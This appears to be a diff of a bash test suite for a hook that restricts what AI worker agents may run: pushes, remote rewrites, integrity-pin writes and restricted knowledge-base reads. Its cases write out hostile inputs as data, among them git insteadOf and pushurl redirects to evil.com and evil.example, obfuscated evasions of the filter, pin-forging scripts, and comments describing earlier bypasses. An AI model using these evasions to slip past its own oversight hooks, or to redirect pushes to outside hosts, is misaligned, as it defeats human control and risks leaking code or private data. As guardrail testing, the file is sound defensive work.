@@ -1,5 +1,5 @@
 #!/usr/bin/env bash
-# Smoke test for scripts/hooks/block-glm-external-writes.sh (HIMMEL-654 GLM
+# Smoke test for scripts/hooks/block-glm-external-writes.sh (GLM
 # lane hardening — deterministic classifier substitute).
 #
 # Usage: bash scripts/hooks/test-block-glm-external-writes.sh
@@ -34,7 +34,7 @@ OWN_HELPER="$OWN_SESSION/append-outbox.sh"
 OWN_HELPER_NATIVE="$OWN_SESSION_NATIVE/append-outbox.sh"
 SIBLING_HELPER_NATIVE="$SIBLING_SESSION_NATIVE/append-outbox.sh"
 
-# HIMMEL-2528 round 2: the anchor-tamper class resolves a `<a>/<b>` refspec
+# The anchor-tamper class resolves a `<a>/<b>` refspec
 # destination against the REMOTE SET of $CLAUDE_PROJECT_DIR (`origin/main` is a
 # tracking ref, `feat/x` is a branch). Pointing every case at a purpose-built
 # fixture repo with exactly one known remote makes that verdict independent of
@@ -47,7 +47,7 @@ git init -q "$ANCHOR_REPO" >/dev/null 2>&1
 git -C "$ANCHOR_REPO" remote add origin https://example.invalid/anchor.git >/dev/null 2>&1
 
 # run_case <json> [VAR=val ...] — extra args become env assignments.
-# HIMMEL-2085: also unset the generalized worker-ness/pin-dir vars so a
+# Also unset the generalized worker-ness/pin-dir vars so a
 # developer's own shell env (or a leftover from an earlier case) can never
 # leak into a case that does not explicitly set them.
 run_case() {
@@ -80,7 +80,7 @@ skip_case() {
     echo "SKIP $label — $reason"
 }
 
-# HIMMEL-1649 round 3: the hook is the EXECUTOR. A valid report is recorded by
+# The hook is the EXECUTOR. A valid report is recorded by
 # the hook and the Bash call is then DENIED (rc=2) with a success message. There
 # is no explicit-allow path any more — an `allow` decision here would be a
 # regression back to executing worker-reachable content, so assert it is absent.
@@ -92,10 +92,9 @@ assert_recorded() {
     printf '%s' "$input" | env -u ANTHROPIC_BASE_URL -u GLM_EXTERNAL_WRITES_OK -u GLM_SESSION_DIR "$@" bash "$HOOK" >"$outf" 2>"$errf"
     rc=$?
     out=$(cat "$outf"); err=$(cat "$errf"); rm -f "$outf" "$errf"
-    # Round 4 [glm-3]: this guard used to read the decision off the capture of
-    # `2>&1 >/dev/null` — i.e. STDERR — so it could never fire. A structured
-    # permissionDecision arrives on STDOUT (where Claude Code reads it, and where
-    # it would OVERRIDE the exit code), and the old capture threw stdout away.
+    # Read the decision off STDOUT, not STDERR: a structured permissionDecision
+    # arrives on STDOUT (where Claude Code reads it, and where it would OVERRIDE the
+    # exit code).
     # Today the hook has no explicit-allow path at all: it allows by a bare
     # `exit 0` with no output, so an `allow` object appearing here at all would
     # be the regression back to executing worker-reachable content.
@@ -140,11 +139,9 @@ run_case_no_jq() {
     printf '%s' "$1" | env -u ANTHROPIC_BASE_URL "ANTHROPIC_BASE_URL=$GLM_URL" PATH="$EMPTY_PATH" "$BASH_ABS" "$HOOK" >/dev/null 2>&1
     echo "$?"
 }
-# HIMMEL-2085 CR history: round 2 [codex-3] fail-OPENED a native-only
-# worker_lane here (scope concern); round 3 [codex-1] correctly called that a
-# reopening of the pin-forging attack this ticket exists to close (jq-missing
-# means the pin-dir class cannot evaluate anything, so fail-open leaves it
-# silently inert) -- reverted back to fail-closed for every worker_lane. The
+# A jq-missing runner fails CLOSED for every worker_lane, native-only included:
+# the pin-dir class cannot evaluate anything without jq, so fail-open would leave
+# it silently inert and reopen the pin-forging attack it exists to close. The
 # SAME jq-missing runner, but for a native-only worker_lane (HIMMEL_WORKER=1,
 # no ANTHROPIC_BASE_URL) instead of glm_lane, pinning that both now agree.
 run_case_no_jq_native() {
@@ -158,7 +155,7 @@ assert_rc "off-lane gh pr create"        0 "$(run_case "$(j_bash 'gh pr create -
 assert_rc "off-lane mcp tool"            0 "$(run_case '{"tool_name":"mcp__plugin_github_github__merge_pull_request","tool_input":{}}')"
 assert_rc "anthropic-url non-glm"        0 "$(run_case "$(j_bash 'git push')" "ANTHROPIC_BASE_URL=https://api.anthropic.com")"
 
-# --- HIMMEL-1649: fixed own-session outbox helper carve-out ---
+# --- fixed own-session outbox helper carve-out ---
 # GLM_SESSION_DIR is the dispatcher-owned inherited-env seam. The hook emits an
 # EXPLICIT allow only for an exact helper invocation carrying one strict
 # base64url token. Write/Edit stay native-denied and the old interpolated node -e
@@ -166,7 +163,7 @@ assert_rc "anthropic-url non-glm"        0 "$(run_case "$(j_bash 'git push')" "A
 OUTBOX_TOKEN="bGFuZSBlMmU"
 # shellcheck disable=SC2016  # literal inherited variable spelling is command text under test
 VAR_APPEND='bash "$GLM_SESSION_DIR/append-outbox.sh" bGFuZSBlMmU'
-# DISTINCT payloads per shape variant (HIMMEL-1649 round 3): all three go to the
+# DISTINCT payloads per shape variant: all three go to the
 # SAME outbox back-to-back, and the F2 consecutive-duplicate suppression would
 # (correctly) swallow the 2nd and 3rd if they repeated the first one's payload.
 NATIVE_TOKEN=$(b64url 'lane e2e native')
@@ -193,7 +190,7 @@ assert_last_record() {
 }
 assert_last_record "glm hook-written note is note-wrapped" '.type == "note" and .text == "lane e2e posix"' "$OWN_OUTBOX"
 
-# (i) HIMMEL-1649 round 3 — THE regression test for codex-adv-1. A booby-trapped
+# (i) THE regression test for the on-disk-helper attack. A booby-trapped
 # helper that would drop a canary must NEVER execute: the hook records the row
 # itself and denies the command, so the canary cannot appear. This is the exact
 # attack the round-2 pathname-trust ALLOW permitted (worker holds Edit on its
@@ -234,7 +231,7 @@ assert_recorded "non-JSON payload note-wrapped" "$(j_bash "bash \"\$GLM_SESSION_
     "$OWN_OUTBOX" "ANTHROPIC_BASE_URL=$GLM_URL" "GLM_SESSION_DIR=$OWN_SESSION_NATIVE"
 assert_last_record "note-wrap preserves the text verbatim" '.type == "note" and .text == "not json { at all"' "$OWN_OUTBOX"
 
-# --- HIMMEL-1649 round 3 (F2): consecutive-duplicate suppression -------------
+# --- consecutive-duplicate suppression -------------
 # The hook appends then denies, which looks like a retryable failure. A retry
 # storm must converge to ONE row, while the same note sent again LATER (after a
 # different record) must still land.
@@ -261,7 +258,7 @@ assert_recorded "F2 a different report still lands" "$(j_bash "bash \"\$GLM_SESS
 assert_recorded "F2 the earlier payload lands again after a different one" "$(j_bash "$DUP_CMD")" \
     "$OWN_OUTBOX" "ANTHROPIC_BASE_URL=$GLM_URL" "GLM_SESSION_DIR=$OWN_SESSION_NATIVE"
 
-# --- HIMMEL-1649 round 3 (F1): the interceptor is a SERVICE above the bypass --
+# --- the interceptor is a SERVICE above the bypass --
 # GLM_EXTERNAL_WRITES_OK disables ENFORCEMENT only. Under bypass the report must
 # STILL be hook-recorded with identical semantics, and the booby-trapped helper
 # must STILL never execute — otherwise a bypass session silently downgrades
@@ -289,7 +286,7 @@ fi
 assert_rc "F1 bypass still disables enforcement (git push allowed)" 0 \
     "$(run_case "$(j_bash 'git push origin main')" "ANTHROPIC_BASE_URL=$GLM_URL" "GLM_EXTERNAL_WRITES_OK=1")"
 
-# --- HIMMEL-1649 round 4 [codex-1]: WHERE the no-execution property holds -----
+# --- WHERE the no-execution property holds -----
 # "No on-disk content executes" is an ENFORCEMENT-mode property. The F1 cases
 # above pin the CONTRACT-SHAPED command under bypass (still hook-recorded, still
 # no execution). These pin the other half honestly: a NEAR-MISS command shape is
@@ -350,7 +347,7 @@ else
     FAILED=$((FAILED + 1))
 fi
 
-# --- HIMMEL-1649 round 9 (CodeRabbit, Major): PowerShell is a MEDIATED shell --
+# --- PowerShell is a MEDIATED shell --
 # hooks.json registers this hook for "Bash|PowerShell|mcp__.*", but the report
 # interceptor and the near-miss deny were gated on tool=="Bash" alone. A
 # PowerShell helper invocation was therefore neither hook-executed nor denied:
@@ -391,7 +388,7 @@ else
     FAILED=$((FAILED + 1))
 fi
 
-# --- HIMMEL-1649 round 4 [codex-adv-r4-1]: a torn JSONL tail ------------------
+# --- a torn JSONL tail ------------------
 # An interrupted earlier append leaves the file ending mid-line. Appending onto
 # it would concatenate the new JSON into that partial line — consumers
 # (fleet-control/aggregator/escalations.ts jsonl()) skip the combined invalid
@@ -473,7 +470,7 @@ assert_rc "glm git push after &&"        2 "$(run_case "$(j_bash 'bun test && gi
 assert_rc "glm git -C path push"         2 "$(run_case "$(j_bash 'git -C /tmp/wt push')" "ANTHROPIC_BASE_URL=$GLM_URL")"
 # shellcheck disable=SC2016  # literal $(git push) is the command text under test, not for expansion
 assert_rc "glm git push in subshell"     2 "$(run_case "$(j_bash 'echo $(git push 2>&1)')" "ANTHROPIC_BASE_URL=$GLM_URL")"
-# gh carve-out (HIMMEL-675): issue ops + pr/run READS allow; everything else denies.
+# gh carve-out: issue ops + pr/run READS allow; everything else denies.
 assert_rc "glm gh pr create"             2 "$(run_case "$(j_bash 'gh pr create --fill')" "ANTHROPIC_BASE_URL=$GLM_URL")"
 assert_rc "glm gh pr merge"              2 "$(run_case "$(j_bash 'gh pr merge 856 --squash')" "ANTHROPIC_BASE_URL=$GLM_URL")"
 assert_rc "glm gh pr comment"           2 "$(run_case "$(j_bash 'gh pr comment 856 --body x')" "ANTHROPIC_BASE_URL=$GLM_URL")"
@@ -490,8 +487,7 @@ assert_rc "glm config --get url (pinned overmatch)" 2 "$(run_case "$(j_bash 'git
 # url.<base>.pushInsteadOf rewrites where a push LANDS without naming a remote
 # or a pushurl, so it is the same escape as `remote set-url` by another key.
 # Both directions are denied: setting one redirects a push, and unsetting one
-# removes an operator redirect the worker was never asked to touch (HIMMEL-1961
-# CR -- the deny existed, nothing pinned it).
+# removes an operator redirect the worker was never asked to touch.
 assert_rc "glm config pushInsteadOf set"   2 "$(run_case "$(j_bash 'git config url.https://github.com/.pushInsteadOf git@github.com:')" "ANTHROPIC_BASE_URL=$GLM_URL")"
 assert_rc "glm config pushInsteadOf unset" 2 "$(run_case "$(j_bash 'git config --unset url.https://github.com/.pushInsteadOf')" "ANTHROPIC_BASE_URL=$GLM_URL")"
 assert_rc "glm config insteadOf rewrite" 2 "$(run_case "$(j_bash 'git config url.https://evil.com/.insteadOf https://github.com/')" "ANTHROPIC_BASE_URL=$GLM_URL")"
@@ -501,7 +497,7 @@ assert_rc "glm config insteadof case variant" 2 "$(run_case "$(j_bash 'git confi
 assert_rc "glm git -c insteadOf one-shot fetch" 2 "$(run_case "$(j_bash 'git -c url.https://evil.com/.insteadOf=https://github.com/ fetch')" "ANTHROPIC_BASE_URL=$GLM_URL")"
 assert_rc "glm git --config-env insteadOf one-shot fetch" 2 "$(run_case "$(j_bash 'git --config-env=url.https://evil.com/.insteadOf=R fetch')" "ANTHROPIC_BASE_URL=$GLM_URL")"
 assert_rc "glm git config set insteadOf rewrite" 2 "$(run_case "$(j_bash 'git config set url.https://evil.com/.insteadOf https://github.com/')" "ANTHROPIC_BASE_URL=$GLM_URL")"
-# HIMMEL-844 round 3: a dequoted key is the same key — quoting/escaping must not slip past.
+# A dequoted key is the same key — quoting/escaping must not slip past.
 assert_rc "glm config single-quoted insteadOf key" 2 "$(run_case "$(j_bash "git config 'url.https://evil.com/.insteadOf' https://github.com/")" "ANTHROPIC_BASE_URL=$GLM_URL")"
 assert_rc "glm config double-quoted insteadOf key" 2 "$(run_case "$(j_bash 'git config "url.https://evil.com/.insteadOf" https://github.com/')" "ANTHROPIC_BASE_URL=$GLM_URL")"
 assert_rc "glm config backslash-split insteadOf key" 2 "$(run_case "$(j_bash 'git config ur\l.https://evil.com/.insteadOf https://github.com/')" "ANTHROPIC_BASE_URL=$GLM_URL")"
@@ -532,18 +528,18 @@ assert_rc "glm round 10 codex-1 NUL via \\c@ ends the segment" 2 "$(run_case "$(
 assert_rc "glm round 10 codex-2 decoy + two adjacent split segments" 2 "$(run_case "$(j_bash "echo '$' ; g\$'\\x69'\$'\\x74' config url.x.insteadOf y")" "ANTHROPIC_BASE_URL=$GLM_URL")"
 assert_rc "glm round 10 plain backslash-t inside the key" 2 "$(run_case "$(j_bash "git config url.x.ins\\teadOf y")" "ANTHROPIC_BASE_URL=$GLM_URL")"
 assert_rc "glm round 10 plain backslash-r inside url" 2 "$(run_case "$(j_bash "git config remote.origin.u\\rl https://evil")" "ANTHROPIC_BASE_URL=$GLM_URL")"
-# HIMMEL-4032: a plain escape OUTSIDE a dollar-quote is a bare char to bash (not a TAB). The
-# `command` prefix keeps the HIMMEL-2528 anchor arm (literal `git` + a dollar-quote) out of it,
+# A plain escape OUTSIDE a dollar-quote is a bare char to bash (not a TAB). The
+# `command` prefix keeps the anchor-tamper arm (literal `git` + a dollar-quote) out of it,
 # so only the insteadof rule can deny the first row.
 assert_rc "glm HIMMEL-4032 dollar-quote + plain escape key" 2 "$(run_case "$(j_bash "command git config url.x.\$'\\x69'ns\\teadOf Y")" "ANTHROPIC_BASE_URL=$GLM_URL")"
 assert_rc "glm HIMMEL-4032 backslash-newline split insteadOf key" 2 "$(run_case "$(j_bash "$(printf 'command git config url.x.inste\\\nadOf Y')")" "ANTHROPIC_BASE_URL=$GLM_URL")"
 assert_rc "glm HIMMEL-4032 dollar-quote + plain key, user.name allowed" 0 "$(run_case "$(j_bash "command git config user.\$'\\x6e'ame x")" "ANTHROPIC_BASE_URL=$GLM_URL")"
-# HIMMEL-4225: a stray apostrophe in a # comment or a heredoc body opens no quote in bash, so it
+# A stray apostrophe in a # comment or a heredoc body opens no quote in bash, so it
 # must not desync the quote-aware stream and hide evasion 1 on the next line.
 assert_rc "glm HIMMEL-4225 apostrophe in a comment, then evasion 1" 2 "$(run_case "$(j_bash "$(printf '%s\n' "# don't panic" "command git config url.x.\$'\\x69'ns\\teadOf Y")")" "ANTHROPIC_BASE_URL=$GLM_URL")"
 assert_rc "glm HIMMEL-4225 apostrophe in a heredoc body, then evasion 1" 2 "$(run_case "$(j_bash "$(printf '%s\n' 'cat <<EOF' "don't panic" EOF "command git config url.x.\$'\\x69'ns\\teadOf Y")")" "ANTHROPIC_BASE_URL=$GLM_URL")"
 assert_rc "glm HIMMEL-4225 apostrophe in a comment, no insteadOf, allowed" 0 "$(run_case "$(j_bash "$(printf '%s\n' "# don't panic" 'echo hi')")" "ANTHROPIC_BASE_URL=$GLM_URL")"
-# HIMMEL-4225 CR round 1: empty and unusual heredoc delimiters (bash ends `<<''` at an empty
+# Empty and unusual heredoc delimiters (bash ends `<<''` at an empty
 # line) and an arithmetic `<<` must not desync the decoder either.
 assert_rc "glm HIMMEL-4225 empty single-quoted heredoc delimiter <<'', then evasion 1" 2 "$(run_case "$(j_bash "$(printf '%s\n' 'cat <<'\'''\''' 'don'\''t panic' '' "command git config url.x.\$'\\x69'ns\\teadOf Y")")" "ANTHROPIC_BASE_URL=$GLM_URL")"
 assert_rc "glm HIMMEL-4225 empty double-quoted heredoc delimiter <<\"\", then evasion 1" 2 "$(run_case "$(j_bash "$(printf '%s\n' 'cat <<""' 'don'\''t panic' '' "command git config url.x.\$'\\x69'ns\\teadOf Y")")" "ANTHROPIC_BASE_URL=$GLM_URL")"
@@ -559,7 +555,7 @@ assert_rc "glm HIMMEL-4225 arithmetic << is not a heredoc, then evasion 1" 2 "$(
 assert_rc "glm HIMMEL-4225 empty heredoc delimiter, no insteadOf, allowed" 0 "$(run_case "$(j_bash "$(printf '%s\n' 'cat <<'\'''\''' 'it'\''s fine' '' 'echo ok')")" "ANTHROPIC_BASE_URL=$GLM_URL")"
 PAD=$(head -c 50000 /dev/zero | tr "\0" a)
 assert_rc "glm round 11 padded pushurl still denied (E2BIG)" 2 "$(run_case "$(j_bash "git config remote.origin.pushurl https://evil.example/x.git ; echo $PAD")" "ANTHROPIC_BASE_URL=$GLM_URL")"
-# The two rows below stay denied on THIS lane by the separate HIMMEL-2528 anchor-tamper
+# The two rows below stay denied on THIS lane by the separate anchor-tamper
 # ANSI-C arm (`git` + a dollar-quote in its args), not by the insteadof rule; pinned so a
 # change to either arm is visible. The codex fence and parity guard pin the ALLOW verdict.
 assert_rc "glm round 7 git commit -m ANSI-C denied by anchor arm (HIMMEL-2528)" 2 "$(run_case "$(j_bash "git commit -m \$'l1\\nl2'")" "ANTHROPIC_BASE_URL=$GLM_URL")"
@@ -588,7 +584,7 @@ assert_rc "glm jira prose in commit msg" 0 "$(run_case "$(j_bash 'git commit -m 
 assert_rc "glm jira CLI path (allowed)"  0 "$(run_case "$(j_bash 'node scripts/jira/dist/index.js transition HIMMEL-1 Done')" "ANTHROPIC_BASE_URL=$GLM_URL")"
 assert_rc "glm bare jira (allowed)"      0 "$(run_case "$(j_bash 'jira list')" "ANTHROPIC_BASE_URL=$GLM_URL")"
 assert_rc "glm jira direct path (allowed)" 0 "$(run_case "$(j_bash './scripts/jira/dist/index.js list')" "ANTHROPIC_BASE_URL=$GLM_URL")"
-# gh issue ops + pr/run reads are operator-allowed on-lane (HIMMEL-675 carve-out).
+# gh issue ops + pr/run reads are operator-allowed on-lane (carve-out).
 assert_rc "glm gh issue list (allowed)"    0 "$(run_case "$(j_bash 'gh issue list')" "ANTHROPIC_BASE_URL=$GLM_URL")"
 assert_rc "glm gh issue create (allowed)"  0 "$(run_case "$(j_bash 'gh issue create --title x --body y')" "ANTHROPIC_BASE_URL=$GLM_URL")"
 assert_rc "glm gh issue comment (allowed)" 0 "$(run_case "$(j_bash 'gh issue comment 858 --body done')" "ANTHROPIC_BASE_URL=$GLM_URL")"
@@ -600,7 +596,7 @@ assert_rc "glm gh pr list (allowed)"       0 "$(run_case "$(j_bash 'gh pr list')
 assert_rc "glm gh run list (allowed)"      0 "$(run_case "$(j_bash 'gh run list')" "ANTHROPIC_BASE_URL=$GLM_URL")"
 assert_rc "glm gh run watch (allowed)"     0 "$(run_case "$(j_bash 'gh run watch 123')" "ANTHROPIC_BASE_URL=$GLM_URL")"
 # qmd KB reads are operator-allowed on-lane (carve-out before the blanket mcp
-# deny), but COLLECTION-SCOPED to "himmel" only (HIMMEL-1239) — an unscoped
+# deny), but COLLECTION-SCOPED to "himmel" only — an unscoped
 # query (no collections filter) could hit salus (PHI vault) and must deny.
 assert_rc "glm mcp qmd query unscoped (denied)" 2 "$(run_case '{"tool_name":"mcp__plugin_qmd_qmd__query","tool_input":{}}' "ANTHROPIC_BASE_URL=$GLM_URL")"
 assert_rc "glm mcp qmd query scoped himmel (allowed)" 0 "$(run_case '{"tool_name":"mcp__plugin_qmd_qmd__query","tool_input":{"collections":["himmel"]}}' "ANTHROPIC_BASE_URL=$GLM_URL")"
@@ -608,7 +604,7 @@ assert_rc "glm mcp qmd query scoped salus (denied)" 2 "$(run_case '{"tool_name":
 assert_rc "glm mcp qmd query scoped luna (denied)" 2 "$(run_case '{"tool_name":"mcp__plugin_qmd_qmd__query","tool_input":{"collections":["luna"]}}' "ANTHROPIC_BASE_URL=$GLM_URL")"
 assert_rc "glm mcp qmd query mixed himmel+salus (denied)" 2 "$(run_case '{"tool_name":"mcp__plugin_qmd_qmd__query","tool_input":{"collections":["himmel","salus"]}}' "ANTHROPIC_BASE_URL=$GLM_URL")"
 assert_rc "glm mcp qmd query empty collections array (denied)" 2 "$(run_case '{"tool_name":"mcp__plugin_qmd_qmd__query","tool_input":{"collections":[]}}' "ANTHROPIC_BASE_URL=$GLM_URL")"
-# CR round 1 (codex-2): collections must be a JSON ARRAY — an object's VALUES
+# Collections must be a JSON ARRAY — an object's VALUES
 # must not satisfy the allow-list via `.[]` (e.g. {"x":"himmel"} must deny,
 # matching the Python-side isinstance(collections, list) contract).
 assert_rc "glm mcp qmd query collections object not array (denied)" 2 "$(run_case '{"tool_name":"mcp__plugin_qmd_qmd__query","tool_input":{"collections":{"x":"himmel"}}}' "ANTHROPIC_BASE_URL=$GLM_URL")"
@@ -622,26 +618,26 @@ assert_rc "glm mcp qmd get scoped himmel (allowed)" 0 "$(run_case '{"tool_name":
 assert_rc "glm mcp qmd get scoped salus (denied)" 2 "$(run_case '{"tool_name":"mcp__plugin_qmd_qmd__get","tool_input":{"file":"qmd://salus/patient.md"}}' "ANTHROPIC_BASE_URL=$GLM_URL")"
 assert_rc "glm mcp qmd get bare filename unscoped (denied)" 2 "$(run_case '{"tool_name":"mcp__plugin_qmd_qmd__get","tool_input":{"file":"README.md"}}' "ANTHROPIC_BASE_URL=$GLM_URL")"
 assert_rc "glm mcp qmd get docid unscoped (denied)" 2 "$(run_case '{"tool_name":"mcp__plugin_qmd_qmd__get","tool_input":{"file":"#abc123"}}' "ANTHROPIC_BASE_URL=$GLM_URL")"
-# CR round 5 (codex-1 r5): qmd_himmel_scoped was grep-based (per-LINE match),
-# so a value with an embedded newline where any line starts with
-# qmd://himmel/ passed even though the value itself starts with salus. It
+# qmd_himmel_scoped must not be grep-based (per-LINE match): a value with an
+# embedded newline where any line starts with qmd://himmel/ would pass even
+# though the value itself starts with salus. It
 # must be a whole-STRING prefix check (matches Python re.match, no MULTILINE).
 QMD_NEWLINE_FILE="$(jq -n --arg file "$(printf 'qmd://salus/secret\nqmd://himmel/x')" '{tool_name:"mcp__plugin_qmd_qmd__get",tool_input:{file:$file}}')"
 assert_rc "glm mcp qmd get salus-then-himmel via newline (denied)" 2 "$(run_case "$QMD_NEWLINE_FILE" "ANTHROPIC_BASE_URL=$GLM_URL")"
 assert_rc "glm mcp qmd multi_get scoped himmel (allowed)" 0 "$(run_case '{"tool_name":"mcp__plugin_qmd_qmd__multi_get","tool_input":{"pattern":"qmd://himmel/*.md"}}' "ANTHROPIC_BASE_URL=$GLM_URL")"
 assert_rc "glm mcp qmd multi_get mixed scoped+unscoped (denied)" 2 "$(run_case '{"tool_name":"mcp__plugin_qmd_qmd__multi_get","tool_input":{"pattern":"qmd://himmel/a.md,notes.md"}}' "ANTHROPIC_BASE_URL=$GLM_URL")"
 assert_rc "glm mcp qmd multi_get luna referenced (denied)" 2 "$(run_case '{"tool_name":"mcp__plugin_qmd_qmd__multi_get","tool_input":{"pattern":"qmd://luna/*.md"}}' "ANTHROPIC_BASE_URL=$GLM_URL")"
-# CR round 1 (glm-3): under nullglob, a glob-bearing non-himmel segment that
-# matches no file must still DENY. The awk-based validation (CR round 4)
+# Under nullglob, a glob-bearing non-himmel segment that
+# matches no file must still DENY. The awk-based validation
 # never does pathname expansion at all, so this stays denied unconditionally
 # regardless of nullglob — kept as a regression pin.
 assert_rc "glm mcp qmd multi_get salus glob under nullglob (denied)" 2 "$(run_case '{"tool_name":"mcp__plugin_qmd_qmd__multi_get","tool_input":{"pattern":"qmd://salus/*.md"}}' "ANTHROPIC_BASE_URL=$GLM_URL" "BASHOPTS=nullglob")"
-# CR round 2 (codex-1 r2): a pattern of only empty comma-separated segments
+# A pattern of only empty comma-separated segments
 # (",") must deny. Originally guarded by an explicit zero-iteration counter;
 # now covered directly by the awk validation's NF==0 / empty-field checks
-# (CR round 4) — kept as a regression pin.
+# — kept as a regression pin.
 assert_rc "glm mcp qmd multi_get comma-only pattern (denied)" 2 "$(run_case '{"tool_name":"mcp__plugin_qmd_qmd__multi_get","tool_input":{"pattern":","}}' "ANTHROPIC_BASE_URL=$GLM_URL")"
-# CR round 4 (codex-1 r4) — ROOT CAUSE: bash word-splitting DROPS empty
+# ROOT CAUSE: bash word-splitting DROPS empty
 # comma-separated fields, so a trailing/leading/adjacent-comma pattern lost
 # its empty segment and was wrongly allowed despite containing one. The awk
 # -F',' replacement preserves empty fields (NF counts them), matching
@@ -664,23 +660,23 @@ assert_rc "glm newline gh smuggle"       2 "$(run_case "$(j_bash "$(printf 'gh p
 assert_rc "glm newline git push"         2 "$(run_case "$(j_bash "$(printf 'echo hi\ngit push')")" "ANTHROPIC_BASE_URL=$GLM_URL")"
 # Pinned over-block: quoted prose whose LINE STARTS with a blocked verb.
 assert_rc "glm prose line-start push (pinned overmatch)" 2 "$(run_case "$(j_bash "$(printf 'git commit -m "notes\ngit push later"')")" "ANTHROPIC_BASE_URL=$GLM_URL")"
-# HIMMEL-2528: this used to pin an ALLOW — gu_shape (the old GLM-lane classifier
+# gu_shape (the old GLM-lane classifier
 # just above) is command-position-anchored, so a commit MESSAGE mentioning the
 # phrase does not match it. The new anchor-tamper class (i) below is a plain,
 # UNANCHORED substring/keyword scan on purpose (same non-anchored philosophy as
-# the HIMMEL-2085 pin-dir class's own pin_text_hit — see that class's header),
+# the pin-dir class's own pin_text_hit — see that class's header),
 # so it now also fires on this prose. Accepted over-block, same direction as
 # every other "Accepted OVER-blocks" row documented at the top of this file.
 assert_rc "glm prose remote set-url (HIMMEL-2528 accepted overmatch)" 2 "$(run_case "$(j_bash 'git commit -m "docs: note the remote set-url tripwire"')" "ANTHROPIC_BASE_URL=$GLM_URL")"
 assert_rc "glm prose config url"         0 "$(run_case "$(j_bash 'git commit -m "docs: update config url notes"')" "ANTHROPIC_BASE_URL=$GLM_URL")"
 assert_rc "glm env-prefix push (pinned limitation)" 0 "$(run_case "$(j_bash 'FOO=1 git push')" "ANTHROPIC_BASE_URL=$GLM_URL")"
 
-# --- HIMMEL-2528 round 5, codex-1: the GLM-lane TWIN of the anchor class's
+# --- The GLM-lane TWIN of the anchor class's
 # line-continuation bypass. This lane's cmd_lc uses the same `tr '\n\r' ';;'`
 # and had the identical gap: gp_shape/gu_shape want `git` and the verb in ONE
 # segment, and a `\<newline>` between them became a `;`. Both fences are now
 # fed by the SAME shared join_line_continuations() — one function, because a
-# second copy is exactly how round 3's twin stayed open for a whole round.
+# second copy is exactly how an earlier twin stayed open for a whole round.
 #
 # ISOLATION, checked PER ROW against the hook with ANTHROPIC_BASE_URL removed
 # and HIMMEL_WORKER=1 instead: all four commands below measure rc=0 there, so
@@ -790,10 +786,10 @@ mk_grants "{\"type\":\"grant\",\"grant_id\":\"g13\",\"arm\":\"git-push\",\"patte
 assert_rc "G13 builtin-allowed fast path"       0 "$(run_case_grant "$(j_bash 'gh pr view 1')")"
 assert_rc "G13 fast path did not consume grant" 0 "$(consumptions g13)"
 
-# --- HIMMEL-2085: hook-integrity pin-dir write-fence (worker-ness, not lane) --
+# --- hook-integrity pin-dir write-fence (worker-ness, not lane) --
 # The pin-dir class is the ONLY class in this file gated on worker_lane
 # (glm_lane OR HIMMEL_WORKER=1) instead of glm_lane alone — see the header's
-# HIMMEL-2085 GENERALIZATION note. These cases pin: (a) a headed/off-lane
+# GENERALIZATION note. These cases pin: (a) a headed/off-lane
 # session stays unaffected, (b) a native (non-GLM) dispatched worker is now
 # denied — closing the exact gap the ticket was filed for, (c) GLM-lane
 # behavior for this NEW class is the same deny, (d) the documented bypass
@@ -814,7 +810,7 @@ assert_rc "pin-dir write denied via native Windows-style path spelling" 2 \
 assert_rc "pin-dir write denied via PowerShell (native worker)" 2 \
     "$(run_case "$(j_pwsh "Set-Content -Path $PIN_FIXTURE/x.json -Value pwned")" "HIMMEL_WORKER=1" "HIMMEL_HOOK_INTEGRITY_DIR=$PIN_FIXTURE")"
 
-# codex-1 (pr-check critic-panel round 4): the outer-command checks above scan
+# The outer-command checks above scan
 # only tool_input.command text, so `bash script.sh` (script.sh containing the
 # forge payload) passed every check while the SCRIPT still forged the pin.
 # Absolute script paths keep this hermetic regardless of the test runner's cwd.
@@ -832,7 +828,7 @@ assert_rc "benign invoked script allowed (round-4 fix, no false positive)" 0 \
 assert_rc "pin-dir invoked-script check skips a nonexistent path (fail-open on non-evaluable)" 0 \
     "$(run_case "$(j_bash 'bash /nonexistent/path/for/this/test.sh')" "HIMMEL_WORKER=1" "HIMMEL_HOOK_INTEGRITY_DIR=$PIN_FIXTURE")"
 
-# codex-1/codex-2 (pr-check critic-panel round 5): the round-4 extraction above
+# The first extraction above
 # only matched an interpreter word immediately followed by whitespace then an
 # UNQUOTED path -- direct execution (no interpreter word at all), a dash-option
 # before the path, a quoted path, and the `node` interpreter (an explicitly
@@ -851,8 +847,7 @@ assert_rc "pin-dir write denied via the node interpreter (codex-2 round 5)" 2 \
 assert_rc "benign direct-exec script still allowed (round-5 fix, no false positive)" 0 \
     "$(run_case "$(j_bash "$PIN_SCRIPT_BENIGN")" "HIMMEL_WORKER=1" "HIMMEL_HOOK_INTEGRITY_DIR=$PIN_FIXTURE")"
 
-# codex-2/codex-3 (pr-check critic-panel round 5, fresh pass AFTER the fix
-# above landed): the regex-patch extraction still truncated a quoted path
+# The regex-patch extraction still truncated a quoted path
 # containing a SPACE to its first whitespace-delimited token, and matched an
 # absolute/path-qualified interpreter (`/bin/bash forge.sh`) as a direct-exec
 # target on the INTERPRETER itself rather than extracting its script argument.
@@ -869,7 +864,7 @@ if [ -n "$PIN_BASH_ABS" ]; then
         "$(run_case "$(j_bash "$PIN_BASH_ABS $PIN_SCRIPT_FORGE")" "HIMMEL_WORKER=1" "HIMMEL_HOOK_INTEGRITY_DIR=$PIN_FIXTURE")"
 fi
 
-# codex-2 (pr-check critic-panel round 5, re-review pass 2): a `cd <dir> &&`
+# A `cd <dir> &&`
 # segment ahead of the script invocation must shift the resolution cwd for
 # every later segment -- the awk tokenizer used a STATIC tool_cwd and missed
 # a script the command actually ran from a subdirectory. $PIN_SCRIPT_DIR is
@@ -879,7 +874,7 @@ fi
 assert_rc "pin-dir write denied via cd-then-invoke with a relative script path (codex-2 round 5 re-review pass 2)" 2 \
     "$(run_case "$(j_bash "cd $PIN_SCRIPT_DIR && bash forge.sh")" "HIMMEL_WORKER=1" "HIMMEL_HOOK_INTEGRITY_DIR=$PIN_FIXTURE")"
 
-# --- HIMMEL-2200: three round-5 re-review residuals in the awk tokenizer,
+# --- Three residuals in the awk tokenizer,
 # root-caused with a single-pass quote/escape-aware scanner (see the file's
 # own commentary above the awk block) instead of another regex/split patch.
 # codex-1: a `;` inside a QUOTED script path used to split the command
@@ -910,7 +905,7 @@ PIN_CD_FAIL_JSON=$(jq -n --arg cmd "cd /this/definitely/does/not/exist/himmel-22
 assert_rc "pin-dir write denied because a failed cd must not advance the modeled cwd (HIMMEL-2200 codex-3)" 2 \
